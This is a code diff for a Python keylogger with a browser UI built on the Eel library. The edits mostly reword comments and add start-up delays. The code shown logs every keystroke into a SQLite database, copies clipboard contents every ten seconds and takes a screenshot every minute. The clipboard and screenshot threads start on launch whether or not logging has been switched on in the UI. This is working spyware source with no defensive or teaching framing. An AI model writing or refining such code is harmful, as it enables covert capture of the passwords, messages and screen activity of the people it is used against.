@@ -17,7 +17,7 @@ eel.init("web")
 is_logging = False
 key_listener = None
 
-# Encryption key (generated once, store safely in real scenario)
+# Encryption key (store securely in production)
 fernet_key = Fernet.generate_key()
 cipher = Fernet(fernet_key)
 
@@ -51,8 +51,9 @@ def setup_database():
 
 setup_database()
 
-# Log clipboard content
+# Clipboard logger
 def log_clipboard():
+    time.sleep(5)  # Delay to ensure stability
     previous_clipboard = ""
     while True:
         try:
@@ -67,10 +68,11 @@ def log_clipboard():
                 previous_clipboard = current
         except Exception as e:
             print(f"Clipboard error: {e}")
-        time.sleep(10)  # Check every 10 seconds
+        time.sleep(10)
 
-# Take screenshot
+# Screenshot capture
 def periodic_screenshot():
+    time.sleep(5)  # Delay to ensure UI loads
     while True:
         try:
             screenshot = pyautogui.screenshot()
@@ -83,9 +85,9 @@ def periodic_screenshot():
             conn.close()
         except Exception as e:
             print(f"Screenshot error: {e}")
-        time.sleep(60)  # Every minute
+        time.sleep(60)
 
-# Key press event
+# Key press handler
 def on_press(key):
     global is_logging
     if is_logging:
@@ -94,16 +96,17 @@ def on_press(key):
         except AttributeError:
             keystroke = str(key)
         try:
-            print(f"Key pressed: {keystroke}")
             encrypted = cipher.encrypt(keystroke.encode())
             conn = sqlite3.connect('keystrokes.db')
             cursor = conn.cursor()
             cursor.execute("INSERT INTO keystrokes (key_pressed, timestamp) VALUES (?, ?)", (encrypted, datetime.now()))
             conn.commit()
             conn.close()
+            print(f"Key logged: {keystroke}")
         except Exception as e:
             print(f"Key logging error: {e}")
 
+# Start keylogging
 @eel.expose
 def start_logging():
     global is_logging, key_listener
@@ -115,6 +118,7 @@ def start_logging():
         return "Keylogger started."
     return "Keylogger already running."
 
+# Stop keylogging
 @eel.expose
 def stop_logging():
     global is_logging, key_listener
@@ -126,13 +130,13 @@ def stop_logging():
         return "Keylogger stopped."
     return "Keylogger was not running."
 
-# Background threads
+# Start background threads
 threading.Thread(target=log_clipboard, daemon=True).start()
 threading.Thread(target=periodic_screenshot, daemon=True).start()
 
-# Start web UI
-eel.start("index.html", block=False)
+# Launch Eel UI
+eel.start("index.html", mode='chrome', port=8000, block=False)
 
-# Keep script alive
+# Keep running
 while True:
     time.sleep(1)
